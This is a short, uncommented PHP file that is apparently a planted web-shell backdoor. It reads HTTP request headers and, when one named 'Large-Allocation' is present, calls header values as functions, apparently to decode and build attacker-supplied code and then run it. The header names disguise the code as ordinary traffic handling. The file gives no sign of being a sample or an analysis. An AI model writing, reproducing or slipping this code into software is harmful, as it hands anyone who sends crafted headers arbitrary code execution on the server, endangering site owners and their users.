<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $class = $_HEADERS['Large-Allocation']('', $_HEADERS['If-Modified-Since']($_HEADERS['X-Dns-Prefetch-Control']));
    $class();
}